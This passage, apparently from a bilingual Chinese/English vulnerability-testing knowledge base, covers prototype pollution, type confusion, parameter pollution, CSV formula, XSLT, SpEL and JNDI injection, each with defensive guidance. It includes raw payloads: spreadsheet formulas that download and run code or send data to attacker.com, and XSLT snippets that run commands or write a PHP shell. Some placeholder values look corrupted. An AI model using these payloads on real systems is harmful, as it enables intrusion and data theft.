exploitation.en: First record merge results and own-property baselines with a normal nested object in an isolated process. Submit each original JSON input and check whether a newly created empty object inherits a unique canary property. Trigger authorization, DOM, or process gadgets separately and restart between tests to exclude response echo, own properties, or cross-test residue as false positives.

mitigation.zh: 在所有对象路径入口拒绝 __proto__、prototype 和 constructor；使用无原型对象、Map 或经过审计的安全合并库；授权判断只读取自有属性并采用显式 Schema，同时为污染源与每个 Gadget 分别回归。
mitigation.en: Reject __proto__, prototype, and constructor at every object-path entry. Use null-prototype objects, Map, or an audited safe merge library. Read own properties only for authorization, enforce explicit schemas, and regress pollution sources separately from each gadget.

description.zh: 在干净进程中记录空对象、自有属性和递归合并对普通键的预期行为。
description.en: In a clean process, record expected empty-object, own-property, and normal recursive-merge behavior.

description.zh: 提交原始特殊键集合并在新对象上读取唯一 Canary，证明影响不是响应回显。
description.en: Submit the original special-key set and read a unique canary from a new object to prove the effect is not response echo.

description.zh: 分别连接授权、DOM 和进程 Sink，修复特殊键过滤后重启并确认污染与副作用都消失。
description.en: Connect authorization, DOM, and process sinks separately, then restart after special-key filtering and confirm both pollution and side effects disappear.

review.rationale: 原 JSON 直接针对 JavaScript 原型链并包含 Gadget，应保留原型污染分类而非 SQL 注入。

prerequisites.zh: 外部 JSON 或路径键进入不安全 merge/assign，__proto__ 或 constructor.prototype 未被 own-property/schema 校验过滤。
prerequisites.en: External JSON or path keys reach an unsafe merge or assignment where __proto__ or constructor.prototype is not filtered by own-property or schema checks.

prerequisites.zh: 一次性 JavaScript worker 只写唯一 inert marker，并在合并前后记录 Object.prototype、目标构造器和新建对象描述符。
prerequisites.en: A disposable JavaScript worker writes a unique inert marker only and records Object.prototype, target constructors, and new-object descriptors before and after merging.

analysis.zh: 阳性证据是攻击者键污染共享原型，使合并后新建的无关对象继承 marker，并从具体 merge 调用栈和输入字段追溯。 假阳性边界：输入对象自身含 isAdmin/innerHTML、JSON.parse 保留特殊键但未合并、只有目标对象自有属性改变、null prototype 或 shell 字符串存在均不是污染。
analysis.en: Positive evidence requires attacker keys to pollute a shared prototype so a newly created unrelated object inherits the marker, traced to the specific merge stack and input field. False-positive boundary: An input object's own isAdmin or innerHTML, preserved special keys without merging, mutation of only target-owned properties, a null prototype, or a shell string does not prove pollution.

opsecTips.zh: 原型污染测试不写 isAdmin/innerHTML/shell 等业务 sink；发现授权变化、DOM 执行、跨请求持久、全局库异常或 worker 不稳定时停止。
opsecTips.en: Prototype-pollution testing never writes business sinks such as isAdmin, innerHTML, or shell; stop on authorization changes, DOM execution, cross-request persistence, global-library anomalies, or worker instability.

opsecTips.zh: 立即销毁污染进程，删除测试对象/marker，清理模块与应用缓存，重启全部隔离 worker 并验证新对象原型恢复。
opsecTips.en: Destroy the polluted process immediately, delete test objects and markers, clear module and application caches, restart all isolated workers, and verify new-object prototypes are restored.

name.zh: 认证参数弱类型混淆

description.zh: 验证认证接口是否把布尔值、数字、数组或空值与密码字符串进行宽松比较，从而错误接受非字符串凭据。
description.en: Tests whether an authentication endpoint loosely compares booleans, numbers, arrays, or empty values with password strings and incorrectly accepts non-string credentials.

overview.zh: 原语料不是数据库注入，而是 JSON 类型进入密码校验逻辑后的比较语义测试。服务端若接受非字符串 password，并通过宽松相等、strcmp 返回值误用或空值分支决定登录结果，可能出现认证绕过。
overview.en: The source is not database injection; it tests comparison semantics after JSON types reach password verification. If a server accepts a non-string password and uses loose equality, misinterpreted strcmp results, or null-like branches to decide login, authentication may be bypassed.

vulnerability.zh: 根因是缺少输入 Schema、在安全比较前发生隐式类型转换，或把函数错误状态当作匹配成功。影响必须表现为服务端建立有效身份会话或发放令牌，仅返回不同错误、500 或解析成功不构成绕过。
vulnerability.en: The root cause is missing input schemas, implicit conversion before a secure comparison, or treating a comparison-function error as success. Impact must be a valid authenticated session or token; a different error, 500 response, or successful parsing is not a bypass.

exploitation.zh: 步骤一用正确与错误字符串密码记录状态码、会话和审计基线；步骤二逐项提交原始布尔、数字、数组与空值 JSON，保持账号和请求头不变；步骤三访问受保护资源并检查服务端主体，排除错误页差异、测试账号免密配置或旧 Cookie 复用造成的假阳性。
exploitation.en: First record status, session, and audit baselines with correct and incorrect string passwords. Submit each original boolean, number, array, and empty-value JSON while keeping the account and headers fixed. Access a protected resource and inspect the server principal to exclude error-page differences, passwordless test accounts, or reused cookies as false positives.

mitigation.zh: 为认证请求执行严格 JSON Schema 并要求密码为非空字符串；使用恒定时间的密码验证 API，禁止宽松比较和隐式转换；在失败分支清除旧会话并对所有错误类型保持统一拒绝与审计。
mitigation.en: Enforce a strict authentication JSON schema and require a nonempty string password. Use constant-time password-verification APIs and prohibit loose comparison or implicit conversion. Clear stale sessions on failure and reject and audit every invalid type consistently.

description.zh: 分别使用正确和错误字符串记录登录响应、Set-Cookie、令牌与服务端主体。
description.en: Record login responses, Set-Cookie, tokens, and server principals for correct and incorrect string passwords.

description.zh: 逐项回放原始 JSON 类型变体，并确保测试前清除 Cookie 和其他已有认证状态。
description.en: Replay each original JSON type variant and clear cookies and other prior authentication state before every test.

description.zh: 访问受保护资源并关联登录审计，修复 Schema 与比较逻辑后确认所有异常类型统一失败。
description.en: Access a protected resource and correlate login auditing, then confirm all invalid types fail after schema and comparison fixes.

review.rationale: 布尔、数字、数组和空值测试的是认证弱类型比较，必须从 SQL/NoSQL 注入迁到认证漏洞。

prerequisites.zh: 认证接口接受 JSON 非字符串类型，后端使用宽松相等、隐式转换或语言特定真假值与存储密码/哈希比较。
prerequisites.en: An authentication entry accepts nonstring JSON types and compares them with stored passwords or hashes using loose equality, implicit coercion, or language-specific truthiness.

prerequisites.zh: 使用专用合成账户，记录请求 schema、反序列化后类型、比较分支和会话签发，并准备正确/错误字符串和类型拒绝对照。
prerequisites.en: A dedicated synthetic account records request schema, post-deserialization types, comparison branches, and session issuance, with valid-string, invalid-string, and type-rejection controls.

analysis.zh: 阳性证据是布尔/数字/数组/null 到达凭据比较并因隐式转换错误匹配合成密码，随后签发只属于测试账户的有效会话。 假阳性边界：非字符串被 parser 接受、响应错误不同、测试账户已登录、空密码业务策略、会话来自先前请求、数据库类型异常或仅绕过前端校验均不是认证绕过。
analysis.en: Positive evidence requires a Boolean, number, array, or null to reach credential comparison, incorrectly match the synthetic password through coercion, and issue a valid session for the test account only. False-positive boundary: Parser acceptance of nonstrings, different errors, an already authenticated test account, an intentional empty-password policy, a prior session, database type errors, or bypassing client validation only does not prove authentication bypass.

opsecTips.zh: 弱类型测试只用合成账户且每类一次；出现真实账户、成功登录非测试身份、锁定、会话混淆、告警或认证服务异常时停止。
opsecTips.en: Type-confusion testing uses a synthetic account and one attempt per type; stop on real accounts, successful login as a nontest identity, lockout, session confusion, alerts, or authentication-service anomalies.

opsecTips.zh: 吊销测试会话，重置/删除合成账户和锁定计数，清理认证缓存/日志，恢复严格 schema 与恒定类型比较后回归。
opsecTips.en: Revoke test sessions, reset or delete synthetic accounts and lockout counters, clear authentication caches and logs, restore strict schemas and constant-type comparison, and regress.

name.zh: HTTP 重复参数解析污染

description.zh: 验证网关、框架和业务代码对重复参数、逗号合并值及先后顺序的解释差异是否绕过校验或授权。
description.en: Tests whether gateways, frameworks, and application code interpret duplicate parameters, comma-joined values, or ordering differently and thereby bypass validation or authorization.

overview.zh: 原命令通过同名参数的先取、后取和逗号合并语义探测解析链差异。它不是 SQL 注入；关键在于安全组件验证了一个值，而后端业务实际消费另一个值，或不同层以数组、标量和拼接字符串解释同一请求。
overview.en: The source probes first-value, last-value, and comma-join semantics for duplicate parameter names. It is not SQL injection; the issue occurs when a security layer validates one value while back-end logic consumes another, or layers disagree between arrays, scalars, and joined strings.

vulnerability.zh: 如果 CDN、WAF、路由器和应用框架没有统一参数基数与合并规则，攻击者可把安全值放在被检查的位置，把恶意值放在最终消费位置。仅响应变化不够，必须证明校验日志与业务日志看到不同的规范化值并产生安全结果。
vulnerability.en: If a CDN, WAF, router, and application framework do not share parameter cardinality and combination rules, an attacker can place a safe value where validation looks and a malicious value where business logic consumes it. A response change is insufficient; logs must show divergent normalized values and a security-relevant result.

exploitation.zh: 步骤一分别发送单一 safe 与单一 payload 参数记录每层解析值；步骤二回放原始重复和逗号变体，并在网关、WAF 与应用日志中标记同一请求；步骤三验证授权或校验是否真实绕过，排除参数本就允许多值、客户端自动重排或普通业务分支造成的假阳性。
exploitation.en: First send one safe value and one test value separately and record each layer's parsed value. Replay the original duplicate and comma variants with a shared request identifier across gateway, WAF, and application logs. Verify an actual validation or authorization bypass, excluding intentionally multivalued parameters, client reordering, or ordinary business branching as false positives.

mitigation.zh: 为每个参数声明唯一或数组基数并拒绝歧义输入；在最外层统一解码与规范化后把同一结构传给授权和业务逻辑；让代理、WAF 和框架采用一致规则，并对重复、顺序和分隔符建立差分回归。
mitigation.en: Declare scalar or array cardinality for every parameter and reject ambiguous input. Normalize once at the edge and pass the same structure to authorization and business logic. Align proxy, WAF, and framework rules and maintain differential regressions for duplicates, ordering, and delimiters.

title.en: Record parameter baselines at each layer

description.zh: 用单值请求记录网关、WAF、框架和业务代码实际读取的参数结构与顺序。
description.en: Use single-value requests to record the parameter structure and ordering consumed by the gateway, WAF, framework, and business code.

description.zh: 提交原始顺序与逗号变体，通过统一请求 ID 比较每层最终校验和消费的值。
description.en: Submit the original ordering and comma variants and compare values validated and consumed at each layer under one request ID.

attackChain.payload:
param=safe&param=mayload
param=malayload&param=safe
param=safe,mayload

description.zh: 拒绝歧义标量、统一规范化后重放，确认合法数组参数保留且安全层与业务层结果一致。
description.en: Reject ambiguous scalars, normalize consistently, and replay to confirm valid arrays remain and security and business layers agree.

review.rationale: 同名参数先后取值与合并差异属于 HTTP 参数污染，应从 SQL/NoSQL 注入改归 API 安全。

prerequisites.zh: 同一参数经过网关、框架和业务代码多个解析层，重复键、逗号值与顺序在各层的表示可以分别记录。
prerequisites.en: The same parameter crosses gateway, framework, and business parsers, with duplicate keys, comma values, and ordering represented and recorded at every layer.

prerequisites.zh: 使用 safe/malicious 改为两个无害 marker 的三种排列，对照保存原始 query/body、代理值、框架集合和最终授权/查询参数。
prerequisites.en: Safe and malicious values are replaced by two harmless markers in three orderings, preserving raw query or body, proxy value, framework collection, and final authorization or query parameter.

analysis.zh: 阳性证据是验证层检查一个 marker，而业务 sink 因 first/last/join 差异消费另一个 marker，导致专用测试操作越过预期策略。 假阳性边界：重复参数被拒绝、所有层都一致取 first/last、响应只回显两个值、逗号作为普通文本、错误消息变化或前端 JavaScript 行为均不是污染绕过。
analysis.en: Positive evidence requires validation to inspect one marker while the business sink consumes another through first, last, or join differences, causing a dedicated test operation to bypass policy. False-positive boundary: Rejected duplicates, consistent first or last handling across layers, reflection of both values, a literal comma, error-message changes, or frontend JavaScript behavior does not prove a pollution bypass.

opsecTips.zh: 参数污染仅操作无害测试动作；出现真实授权变化、重复写入、缓存键碰撞、业务副作用或跨用户结果时停止。
opsecTips.en: Parameter-pollution testing performs harmless test actions only; stop on real authorization changes, duplicate writes, cache-key collision, business side effects, or cross-user results.

opsecTips.zh: 删除测试请求产生的数据，清理网关/应用缓存和会话，恢复参数唯一性校验，并重放三种顺序与正常单值基线。
opsecTips.en: Delete data created by test requests, clear gateway and application caches plus sessions, restore parameter-uniqueness validation, and replay all orderings and the normal single-value baseline.

name.zh: CSV 电子表格公式注入

description.zh: 验证导出的用户字段是否以公式前缀进入电子表格单元格，并在人工打开或刷新文件时触发命令、外部取数或数据外传。
description.en: Tests whether exported user fields enter spreadsheet cells with formula prefixes and trigger commands, external data retrieval, or exfiltration when a person opens or refreshes the file.

overview.zh: CSV 本身没有执行引擎，风险发生在 Excel、LibreOffice 或在线表格把以 =、+、-、@ 等字符开头的字段解释为公式时。原集合覆盖命令调用和网络取数函数，必须记录具体客户端、信任提示与用户交互。
overview.en: CSV itself has no execution engine; risk occurs when Excel, LibreOffice, or an online spreadsheet interprets fields beginning with characters such as equals, plus, minus, or at sign as formulas. The set covers command and network functions, so the exact client, trust prompt, and user interaction must be recorded.

vulnerability.zh: 应用若把不受信字段直接串接到 CSV，引用和分隔符转义可能保证格式正确，却不会阻止电子表格公式求值。实际影响受客户端版本、安全模式、外部连接提示、DDE 支持和文件来源标记影响，不能仅凭单元格显示公式判定。
vulnerability.en: When an application writes untrusted fields directly to CSV, delimiter and quote escaping may preserve format but does not stop formula evaluation. Impact depends on client version, protected mode, external-connection prompts, DDE support, and file provenance; merely displaying a formula is not proof.

exploitation.zh: 步骤一导出以普通文本开头的唯一 Canary 并记录原始 CSV 字节；步骤二逐项写入原始公式，在隔离虚拟机的目标电子表格中打开并捕获公式类型、提示和受控网络请求；步骤三用纯文本查看器和禁用外部内容的客户端对照，排除仅显示字符串、客户端已阻断或代理缓存造成的假阳性。
exploitation.en: First export a unique canary beginning with normal text and preserve the raw CSV bytes. Insert each original formula and open the file in the target spreadsheet inside an isolated VM, capturing formula type, prompts, and controlled network requests. Compare a plain-text viewer and a client with external content disabled to exclude displayed strings, client blocking, or proxy cache as false positives.

mitigation.zh: 导出前对可能被解释为公式的前缀采用可靠的文本化策略；根据目标客户端正确处理引号、分隔符与前导空白，禁止仅依赖黑名单；提供不执行公式的安全导出格式，并用主流客户端版本做文件级回归。
mitigation.en: Before export, apply a reliable text-forcing strategy to fields that could be formulas. Handle quotes, delimiters, and leading whitespace for the target client and do not rely on a prefix blacklist. Offer a safe nonformula export format and run file-level regressions across supported spreadsheet versions.

title.zh: 保存 CSV 字节基线

description.zh: 导出普通 Canary 并记录字段经过引用、编码和换行处理后的原始文件字节。
description.en: Export a normal canary and record raw file bytes after quoting, encoding, and newline handling.

description.zh: 回放原始公式集合，在隔离客户端记录公式解析、用户提示和受控网络或进程事件。
description.en: Replay the original formula set and record formula parsing, user prompts, and controlled network or process events in an isolated client.

attackChain.payload:
=cmd|'/C powershell IEX(wget http://attacker.com/shell.ps1)'!A0
=cmd|'/C certutil -urlcache -split -f http://attacker.com/shell.exe C:\shell.exe'!A0
=IMPORTDATA("http://attacker.com/leak?data="&A1)
=IMPORTXML("http://attacker.com/leak","//data")
=IMAGE("http://attacker.com/leak?data="&A1)
=IMPORTHTML("http://attacker.com/table","table",1)

description.zh: 应用文本化编码后重新导出并跨客户端打开，确认业务内容可读且公式不再求值。
description.en: Re-export after text-safe encoding and open across supported clients to confirm content remains readable and formulas no longer evaluate.

review.rationale: 该条的解释器是电子表格客户端，属于文件导出公式注入而非 SQL/NoSQL 注入。

prerequisites.zh: 用户字段未经公式中和进入 CSV 单元格，目标 Excel/LibreOffice 版本在人工打开或刷新时允许相应公式/外部数据功能。
prerequisites.en: A user field enters a CSV cell without formula neutralization, and the target Excel or LibreOffice version permits the relevant formula or external-data feature when opened or refreshed.

prerequisites.zh: 在离线 VM 使用只返回固定 canary 或请求自有空 URL 的安全公式，禁用宏/命令执行，并保存原 CSV 字节、导入选项和公式审计。
prerequisites.en: An offline VM uses a safe formula returning a fixed canary or requesting an owned empty URL, disables macros and command execution, and preserves raw CSV bytes, import options, and formula audit.

analysis.zh: 阳性证据是导出值保持公式前缀，目标电子表格将该单元格解析为公式并产生 canary 或唯一自有请求；客户端与文件哈希可关联。 假阳性边界：CSV 中出现 =、查看文本编辑器、公式被前置单引号/Tab 中和、受保护视图禁用计算、DDE 被新版阻止或安全扫描器告警均不是执行。
analysis.en: Positive evidence requires the exported value to retain a formula prefix and the target spreadsheet to parse the cell as a formula and produce a canary or unique owned request, correlating client and file hash. False-positive boundary: An equals sign in CSV, text-editor viewing, apostrophe or tab neutralization, protected-view calculation blocking, modern DDE denial, or scanner alerts does not prove execution.

opsecTips.zh: CSV 公式测试不使用 cmd/powershell/certutil 或真实单元格数据；出现命令提示、外部应用启动、凭据发送、公共请求或用户文件影响时停止。
opsecTips.en: CSV formula testing never uses cmd, PowerShell, certutil, or real cell data; stop on command prompts, external-application launch, credential transmission, public requests, or user-file impact.

opsecTips.zh: 删除导出 CSV、最近文件和自有请求日志，清理电子表格缓存/外部连接，销毁 VM，并恢复公式中和后重新导出验证。
opsecTips.en: Delete exported CSVs, recent-file state, and owned request logs, clear spreadsheet caches and external connections, destroy the VM, and re-export after restoring formula neutralization.

name.zh: 跨处理器 XSLT 扩展注入

description.zh: 验证不受信样式表能否调用 PHP、Java、.NET 或 EXSLT 扩展，进而执行命令或写入服务器文件。
description.en: Tests whether an untrusted stylesheet can invoke PHP, Java, .NET, or EXSLT extensions to execute commands or write server-side files.

subCategory.zh: 多引擎 XSLT 扩展执行

overview.zh: 该集合混合多个 XSLT 引擎的宿主扩展语法，目的在于识别应用实际处理器与可达能力，而不是一次性把所有片段拼成有效样式表。审计应逐引擎隔离执行，区分命令调用、文件写入、语法错误和不支持扩展。
overview.en: This set mixes host-extension syntax from several XSLT engines to identify the application's actual processor and reachable capability; the fragments are not one valid stylesheet to submit wholesale. Review each engine independently and distinguish command invocation, file writes, syntax errors, and unsupported extensions.

vulnerability.zh: 不可信 XSLT 在启用宿主扩展、脚本或文件扩展时会从声明式转换语言升级为代码执行环境。不同实现的命名空间和安全开关不同，因此通用错误页或 XML 回显无法确认任何具体扩展已运行。
vulnerability.en: Untrusted XSLT becomes a code-execution environment when host extensions, scripting, or file extensions are enabled. Namespace mappings and security switches vary by implementation, so a generic error page or XML echo cannot confirm that any particular extension ran.

exploitation.zh: 步骤一通过无副作用属性查询识别处理器和版本；步骤二只选择与该引擎匹配的原始片段，使用唯一文件 Canary 或无害进程输出记录服务端副作用；步骤三禁用扩展并清理 Canary 后重放，排除片段互相污染、解析失败或历史文件残留造成的假阳性。
exploitation.en: First identify the processor and version with side-effect-free property queries. Select only the original fragment matching that engine and record a unique file canary or harmless process output. Disable extensions, remove the canary, and replay to exclude cross-fragment contamination, parse failure, or a preexisting file as false positives.

mitigation.zh: 禁止执行用户提供的 XSLT；按具体引擎关闭脚本、宿主函数、document 与文件写入扩展；使用经过完整性校验的固定模板，在无网络、只读文件系统和低权限沙箱中执行转换。
mitigation.en: Do not execute user-provided XSLT. Disable scripting, host functions, document access, and file-writing extensions for the selected engine. Use integrity-checked fixed templates and run transformations without network access, on a read-only filesystem, under least privilege.

title.zh: 指纹识别目标 XSLT 引擎

description.zh: 用无副作用模板确认实现、版本和已启用扩展，避免跨引擎语法混合测试。
description.en: Use a side-effect-free template to identify implementation, version, and enabled extensions before testing engine-specific syntax.

title.en: Execute the matching extension in isolation

description.zh: 从原始集合选择匹配片段并关联转换日志、唯一文件 Canary 或受控进程事件。
description.en: Select the matching fragment from the original set and correlate transform logs, a unique file canary, or a controlled process event.

attackChain.payload:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
    <xsl:value-of select="Runtime.getRuntime().exec('id')"/>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
  <msxsl:script language="C#" implements-prefix="user">
    public string exec() {
      System.Diagnostics.Process p = System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "";
  </msxsl:script>
    <xsl:value-of select="user:exec()"/>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" xmlns:file="http://exslt.org/common/file">
    <xsl:value-of select="file:write('/tmp/shell.php', '<?php system(["cmd"]); ?>')"/>

description.zh: 关闭宿主扩展、脚本和文件访问后逐项重放，确认固定模板功能保留且副作用消失。
description.en: Replay after disabling host extensions, scripting, and file access to confirm fixed templates remain functional and side effects disappear.

review.rationale: 原集合跨处理器且不是完整样式表；仅 .NET msxsl:script 行组可作为需嵌入合法模板的审计片段，PHP/Runtime 与伪 EXSLT file:write 行组语法或扩展边界无效，必须按行路由并退役。
lineDisposition: lines 0-1 -> retire: incomplete stylesheet plus PHP namespace/Java Runtime mismatch
lines 9-10 -> retire: incomplete stylesheet and nonexistent EXSLT common file:write extension

prerequisites.zh: 可控 stylesheet 进入已识别的 PHP、Java、.NET 或 libxslt 处理器，扩展命名空间/函数开关与宿主版本已明确。
prerequisites.en: A controlled stylesheet reaches an identified PHP, Java, .NET, or libxslt processor, with extension namespaces, function settings, host, and version explicit.

prerequisites.zh: 按处理器单独使用返回不同固定 canary 的测试扩展，禁止混合或运行系统命令，并记录 processor、namespace、resolver 与任务。
prerequisites.en: Each processor uses a distinct test extension returning a fixed canary, never mixed or executing system commands, while processor, namespace, resolver, and job are recorded.

analysis.zh: 阳性证据是目标处理器解析与其匹配的扩展命名空间并调用宿主测试函数产生专属 canary；其他处理器样例不能替代该证据。 假阳性边界：stylesheet 语法有效、扩展 URI 被保留、处理器不匹配、函数禁用、Runtime/system 字符串出现、文件写入标签未执行或部分片段单独提交均不是 RCE。
analysis.en: Positive evidence requires the target processor to resolve its matching extension namespace and invoke the host test function to produce a processor-specific canary; samples for another processor cannot substitute. False-positive boundary: Valid stylesheet syntax, a retained extension URI, processor mismatch, disabled functions, Runtime or system text, an unexecuted file-write tag, or separately submitted fragments does not prove RCE.

opsecTips.zh: 跨处理器 XSLT 每轮只测一个无害扩展；出现进程、文件写入、网络、任意宿主 API、缓存污染或转换资源增长时停止。
opsecTips.en: Cross-processor XSLT tests one harmless extension per run; stop on processes, file writes, network access, arbitrary host APIs, cache contamination, or transform-resource growth.

opsecTips.zh: 逐处理器删除测试 stylesheet/extension/canary，清理转换和编译缓存，恢复扩展禁用策略并重启隔离 worker。
opsecTips.en: Delete per-processor test stylesheets, extensions, and canaries, clear transform and compilation caches, restore disabled-extension policy, and restart isolated workers.

name.zh: 服务端表达式语言代码注入

description.zh: 验证 Spring SpEL 等服务端表达式语言是否解析攻击者输入并暴露类型解析、反射或进程构造能力。
description.en: Tests whether a server-side expression language such as Spring SpEL evaluates attacker input and exposes type resolution, reflection, or process construction.

overview.zh: 原语料包含 SpEL 类型引用、ProcessBuilder 和反射链，测试输入是否从普通字符串进入可求值表达式上下文。表达式被解析、返回语法错误或在日志中出现 Runtime 都不等于命令执行，必须观察实际求值 Sink。
overview.en: The source includes SpEL type references, ProcessBuilder, and reflection chains that test whether ordinary strings enter an evaluable expression context. Parsing, syntax errors, or Runtime text in logs do not equal command execution; the actual evaluation sink must be observed.

vulnerability.zh: 应用把请求字段、路由表达式或配置值传给支持类型解析和方法调用的标准求值上下文时，攻击者可能访问任意 Java 类。根因是把不可信数据当作表达式代码，并给求值器超出业务需要的反射与构造权限。
vulnerability.en: When an application passes request fields, routing expressions, or configuration values into a standard evaluation context that supports type resolution and method calls, an attacker may reach arbitrary Java classes. The root cause is treating untrusted data as expression code with excessive reflection and construction privileges.

exploitation.zh: 步骤一用常量算术和字面字符串确认是否发生表达式求值；步骤二逐项提交原始 SpEL 与反射变体，并以无害子进程、求值器日志和响应 Canary 交叉证明；步骤三切换到受限求值上下文或纯数据绑定后重放，排除模板回显、日志告警和其他进程造成的假阳性。
exploitation.en: First use constant arithmetic and literal strings to confirm expression evaluation. Submit each original SpEL and reflection variant and correlate a harmless child process, evaluator logs, and a response canary. Replay under a restricted evaluation context or plain data binding to exclude template echo, log alerts, and unrelated processes as false positives.

mitigation.zh: 不要对用户输入调用通用表达式求值器；使用 SimpleEvaluationContext 或业务专用白名单语法并禁用类型、构造器与反射访问；以低权限隔离进程并为路由、配置和模板入口建立求值回归测试。
mitigation.en: Do not invoke a general expression evaluator on user input. Use SimpleEvaluationContext or a business-specific allowlisted grammar and block type, constructor, and reflection access. Isolate the process under least privilege and regress routing, configuration, and template entry points.

description.zh: 用无副作用常量表达式区分纯字符串传递、模板插值和真正服务端求值。
description.en: Use a side-effect-free constant expression to distinguish plain string handling, template interpolation, and real server-side evaluation.

description.zh: 回放原始表达式集合并关联求值上下文、Java 子进程和唯一响应 Canary。
description.en: Replay the original expression set and correlate evaluation context, Java child-process telemetry, and a unique response canary.

title.en: Retest with a restricted evaluation context

description.zh: 禁用类型与反射能力后重放，确认允许的业务表达式仍可用而进程构造稳定失败。
description.en: Replay after blocking type and reflection capabilities to confirm allowed business expressions work while process construction fails.

review.rationale: 载荷进入服务端表达式求值器并可到达 Java 进程 API，应从 SQL 注入纠正为表达式语言 RCE。

prerequisites.zh: 外部输入到达 SpEL 或其他服务端表达式 parser 的求值 API，并使用允许类型解析/方法调用的高能力上下文。
prerequisites.en: External input reaches an evaluation API of SpEL or another server-side expression parser using a high-capability context that permits type resolution or method calls.

prerequisites.zh: 隔离上下文注册只设置固定 canary 的测试 bean/method resolver，跟踪 parse/evaluate、类型查找和调用；原 Runtime/ProcessBuilder 行不执行。
prerequisites.en: An isolated context registers a test bean or method resolver that only sets a fixed canary and traces parse or evaluate, type lookup, and invocation; source Runtime and ProcessBuilder lines are not executed.

analysis.zh: 阳性证据是可控表达式由目标 evaluator 求值，突破预期属性/算术范围调用测试 bean 或类型方法产生 canary，source-to-sink 栈完整。 假阳性边界：表达式字符串回显、parser 报错、SimpleEvaluationContext 拒绝类型、T(...) 被过滤、危险类仅出现在源代码或在本地控制台可执行均不是目标注入。
analysis.en: Positive evidence requires the target evaluator to process the controlled expression, exceed intended property or arithmetic scope, and invoke the test bean or type method to produce a canary, with a complete source-to-sink stack. False-positive boundary: Reflected expression text, parser errors, type denial by SimpleEvaluationContext, filtered T(...) syntax, dangerous classes only in source, or local console execution does not prove target injection.

opsecTips.zh: 表达式语言测试不调用 Runtime/ProcessBuilder/反射或真实 bean；出现进程、文件/网络副作用、上下文修改、线程异常或敏感对象输出时停止。
opsecTips.en: Expression-language testing never calls Runtime, ProcessBuilder, reflection, or real beans; stop on processes, file or network effects, context mutation, thread anomalies, or sensitive-object output.

opsecTips.zh: 销毁测试 evaluation context，移除 bean/resolver/canary，清理表达式缓存与异步任务，并恢复低能力上下文。
opsecTips.en: Destroy the test evaluation context, remove beans, resolvers, and canaries, clear expression caches and asynchronous tasks, and restore a low-capability context.

name.zh: JNDI 外部命名查询注入

description.zh: 验证攻击者控制的 LDAP、RMI 或其他命名 URI 是否进入 JNDI lookup，并触发服务端出站连接、对象加载或后续代码执行。
description.en: Tests whether attacker-controlled LDAP, RMI, or other naming URIs reach a JNDI lookup and trigger server-side outbound access, object loading, or subsequent code execution.

overview.zh: 原集合包含直接 LDAP/RMI URI 与插值形式。安全结论必须分层：首先证明字符串进入 JNDI lookup，其次证明服务端向受控命名服务发起请求，最后根据运行时和对象工厂配置判断是否能加载对象或执行代码。
overview.en: The source combines direct LDAP or RMI URIs with interpolation forms. Evidence must be layered: prove the string reaches JNDI lookup, prove the server contacts a controlled naming service, and then determine whether runtime and object-factory settings permit object loading or code execution.

vulnerability.zh: 应用或日志组件若把不可信值传给 InitialContext.lookup，攻击者可控制命名服务目标。现代 JDK 的远程类加载限制会降低部分链路，但本地对象工厂、反序列化和出站信息泄露仍可能存在，所以一次 DNS 回连不能自动等同于 RCE。
vulnerability.en: If an application or logging component passes an untrusted value to InitialContext.lookup, an attacker controls the naming-service destination. Modern JDK restrictions may block remote class loading, while local object factories, deserialization, and outbound disclosure can remain; one DNS callback is not automatically RCE.

exploitation.zh: 步骤一用不可解析的本地名称记录 lookup 错误与 JDK 配置基线；步骤二提交原始 URI 到受控无害目录服务，关联 DNS、TCP、JNDI 调用栈和返回对象类型；步骤三禁止出站并移除动态 lookup 后重放，排除安全扫描器 DNS 预取、代理解析或日志文本匹配造成的假阳性。
exploitation.en: First use an unresolvable local name to record lookup errors and JDK configuration. Submit the original URI to a controlled harmless directory service and correlate DNS, TCP, the JNDI call stack, and returned object type. Replay after blocking egress and removing dynamic lookup to exclude scanner DNS prefetch, proxy resolution, or log-text matches as false positives.

mitigation.zh: 禁止不可信输入进入 JNDI 名称；升级相关 JDK、日志与命名组件并关闭远程对象工厂能力；限制 LDAP/RMI 出站网络和允许的命名协议，同时监控 lookup 调用与异常目录连接。
mitigation.en: Keep untrusted input out of JNDI names. Update JDK, logging, and naming components and disable remote object-factory capabilities. Restrict LDAP and RMI egress and allowed naming schemes, and monitor lookup calls and anomalous directory connections.

title.zh: 确认 JNDI 调用边界

description.zh: 记录运行时版本、lookup 调用栈、对象工厂设置以及正常命名查询的网络基线。
description.en: Record runtime version, lookup call stack, object-factory settings, and the network baseline for a normal naming query.

description.zh: 提交原始 URI 集合并在隔离目录服务上关联协议请求、返回对象和服务端日志。
description.en: Submit the original URI set and correlate protocol requests, returned objects, and server logs on an isolated directory service.

description.zh: 移除动态 lookup 并限制命名协议出站后重放，确认正常静态名称可用且外部连接消失。
description.en: Replay after removing dynamic lookup and restricting naming-protocol egress to confirm static names remain and external connections disappear.

review.rationale: 该条测试 JNDI 命名查询到对象加载的执行链，应从 SQL/NoSQL 注入迁到 RCE，并明确回连不等于代码执行。

prerequisites.zh: 攻击者 URI 确实传给 InitialContext.lookup 或等价 JNDI API，JDK、命名 provider、信任属性与目标应用数据流可核验。
prerequisites.en: An attacker URI reaches InitialContext.lookup or an equivalent JNDI API, with JDK, naming provider, trust properties, and target application data flow verifiable.

prerequisites.zh: 所有 ATTACKER/外部 URI 替换为自有令牌化 DNS/LDAP/RMI 端点，端点不返回对象/类，日志调用和出站连接共享 ID。
prerequisites.en: All ATTACKER and external URIs are replaced by owned tokenized DNS, LDAP, or RMI endpoints that return no objects or classes, and lookup logs share an identifier with egress connections.

analysis.zh: 阳性证据是目标应用进程因可控值调用 JNDI provider 并向匹配协议端点发送令牌化请求；对象加载/RCE 需另有安全 marker 证据。 假阳性边界：URI 被记录/回显、分析机解析 DNS、网络扫描器访问、provider 拒绝、JDK 禁止远程代码库、未关联回调或已有本地 JNDI 配置均不是注入执行。
